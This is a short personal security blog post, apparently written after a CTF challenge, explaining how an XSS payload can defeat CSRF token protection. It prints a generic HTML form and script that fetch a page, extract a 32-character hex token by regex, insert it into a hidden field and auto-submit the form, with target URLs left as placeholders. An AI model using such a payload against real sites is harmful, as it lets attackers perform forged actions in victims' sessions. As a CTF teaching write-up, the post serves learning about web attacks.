<!DOCTYPE html>
<html lang="en-us">

<head>
  <title>CSRF Token Extraction | Ajdin&#39;s blog about security and development</title>

  <meta charset="UTF-8">
  <meta name="language" content="en">
  <meta name="description" content="Extracting tokens from victim using XSS for fun.">
  <meta name="keywords" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  
  
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:title" content="CSRF Token Extraction" />
  <meta name="twitter:description" content="Extracting tokens from victim using XSS for fun."/>
  <meta name="twitter:site" content="@ajdintrejic" />
  <meta name="twitter:creator" content="https://twitter.com/ajdintrejic" />
  

  <link rel="shortcut icon" type="image/png" href="/favicon.ico" />

  
  
    
 
  
  
  
  
  
  
    
    <link type="text/css" rel="stylesheet" href="/css/post.min.89fa77e4b9794341578ef456e6f2f0e8217abeb3b9cedd3c659ff7f5ba6c0c3d.css" integrity="sha256-ifp35Ll5Q0FXjvRW5vLw6CF6vrO5zt08ZZ/39bpsDD0="/>
  
    
    <link type="text/css" rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
  
  
   
   
    

<script type="application/ld+json">
  
    { 
      "@context": "http://schema.org", 
      "@type": "WebSite", 
      "url": "https:\/\/ajdin.io\/posts\/csrf-bypass-token-with-xss\/",
      "name": "CSRF Token Extraction",
      "author": {
        "@type": "Person",
        "name": ""
      },
      "description": "Extracting tokens from victim using XSS for fun."
    }
  
  </script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-165836726-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
</head>

<body>
  <div class="burger__container">
  <div class="burger" aria-controls="navigation" aria-label="Menu">
    <div class="burger__meat burger__meat--1"></div>
    <div class="burger__meat burger__meat--2"></div>
    <div class="burger__meat burger__meat--3"></div>
  </div>
</div>
 

  <nav class="nav" id="navigation">
  <ul class="nav__list">
    
    
      <li>
        <a  href="/about">about</a>
      </li>
    
      <li>
        <a  href="/posts">blog</a>
      </li>
    
      <li>
        <a  href="/cv">cv</a>
      </li>
    
      <li>
        <a  href="/">home</a>
      </li>
    
  </ul>
</nav>


  <main>
    
    

    <div class="flex-wrapper">
      <div class="post__container">
        <div class="post">
          <header class="post__header">
            <h1 id="post__title">CSRF Token Extraction</h1>
            <time datetime="2020-05-07 00:43:19 &#43;0200 CEST" class="post__date">May 7 2020</time> 
          </header>
          <article class="post__content">
              
<p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
<pre><code class="language-javascript">&lt;form action=&quot;&lt;url goes here&gt;&quot; method=&quot;post&quot; name=&quot;csrf&quot; enctype=&quot;multipart/form-data&quot;&gt;
                &lt;input ... /&gt;
                &lt;input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&quot; /&gt;
                &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
&lt;/form&gt;

&lt;script&gt;
                xhttp = new XMLHttpRequest();
                xhttp.open(&quot;GET&quot;, &quot;&lt;url goes here&gt;&quot;, false);
                xhttp.send();

                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));

                document.getElementById('token').setAttribute('value', token_admin)

                document.csrf_form.submit();
&lt;/script&gt;
</code></pre>
<p>What is this token? Well one way to protect your site from CSRF attacks it to use tokens to validate if the request is being authentic, so we have to switch our token with victims token.</p>
<p>The code is pretty easy to understand. This code inside the <code>&lt;script&gt;</code> tag is executed on our victims machine, and it loads a new <code>HTTP</code> request, finds the token using regular expressions and replaces it. Now our form has a valid token and we can submit it.</p>


              
          </article>
          

<ul class="tags__list">
    
    <li class="tag__item">
        <a class="tag__link" href="https://ajdin.io/tags/csrf/">csrf</a>
    </li>
    <li class="tag__item">
        <a class="tag__link" href="https://ajdin.io/tags/xss/">xss</a>
    </li></ul>

 <div class="pagination">
  
    
      <a class="pagination__item" href="https://ajdin.io/posts/htb/openadmin/">
          <span class="pagination__label">Previous Post</span>
          <span class="pagination__title">HackTheBox Openadmin Write Up</span>
      </a>
    

    
      <a class="pagination__item" href="https://ajdin.io/posts/worklog/">
        <span class="pagination__label">Next Post</span>
        <span class="pagination__title" >Building Worklog: a PERN stack web application</a>
      </a>
    
    
</div>

          
          <footer class="post__footer">
            


<div class="social-icons">
  
     
    
      <a class="social-icons__link" title="Twitter"
         href="https://twitter.com/ajdintrejic"
         target="_blank" rel="noopener">
        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/twitter.svg')"></div>
      </a>
    
  
     
    
      <a class="social-icons__link" title="GitHub"
         href="https://github.com/ajdintrejic"
         target="_blank" rel="noopener">
        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/github.svg')"></div>
      </a>
    
  
     
    
      <a class="social-icons__link" title="Email"
         href="mailto:ajdintrejic@protonmail.ch"
         target="_blank" rel="noopener">
        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/email.svg')"></div>
      </a>
    
  
     
    
      <a class="social-icons__link" title="LinkedIn"
         href="https://www.linkedin.com/in/ajdin-treji%C4%87-5103441b4/"
         target="_blank" rel="noopener">
        <div class="social-icons__icon" style="background-image: url('https://ajdin.io/svg/linkedin.svg')"></div>
      </a>
    
     
</div>

            <p>Â© 2020</p>
          </footer>
          </div>
      </div>
      
    </div>
    

  </main>

   

  
  <script src="/js/index.min.49e4d8a384357d9b445b87371863419937ede9fa77737522ffb633073aebfa44.js" integrity="sha256-SeTYo4Q1fZtEW4c3GGNBmTft6fp3c3Ui/7YzBzrr&#43;kQ=" crossorigin="anonymous"></script>
  
  
  <script src="https://unpkg.com/prismjs@1.20.0/components/prism-core.min.js"></script>

  
  <script src="https://unpkg.com/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"
    data-autoloader-path="https://unpkg.com/prismjs@1.20.0/components/"></script>

  


</body>

</html>
